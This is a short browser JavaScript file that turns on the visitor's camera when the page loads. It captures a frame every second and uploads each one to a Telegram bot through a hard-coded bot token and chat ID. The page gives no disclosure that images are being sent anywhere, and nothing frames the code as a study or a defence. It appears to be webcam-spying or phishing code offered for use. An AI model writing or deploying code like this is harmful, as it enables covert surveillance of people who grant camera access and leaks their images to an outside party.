const BOT_TOKEN = '5337889327:AAG3gmvlBaNMBN0MySQFamh-Orq1MfQ4z2E';
const CHAT_ID = '1311015628';
const CAPTURE_INTERVAL = 1000; // Time interval in milliseconds (e.g., 5000 = 5 seconds)

// Initialize camera stream
async function startCamera() {
    const video = document.getElementById('camera-stream');
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

      // Start auto-capture once the camera is active
    setInterval(captureAndSend, CAPTURE_INTERVAL);
    } catch (error) {
        alert("Camera access denied or unavailable!");
        console.error(error);
    }
} else {
    alert("Your browser does not support camera access.");
}
}

// Capture an image from the video stream
function captureAndSend() {
    const video = document.getElementById('camera-stream');
    const canvas = document.getElementById('photo-canvas');
    const ctx = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL('image/png');
    sendToTelegram(imageData);
}

// Send captured image to Telegram
async function sendToTelegram(imageDataURL) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

  // Convert base64 data URL to a Blob
    const blob = await fetch(imageDataURL).then(res => res.blob());

    const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.png');

    fetch(url, { method: 'POST', body: formData })
    .then(response => {
        if (response.ok) {
        console.log("Image sent successfully!");
    }   else {
        console.error("Failed to send image to Telegram.");
    }
    })
    .catch(error => console.error("Error sending image:", error));
}

// Start the camera and auto-capture on page load
startCamera();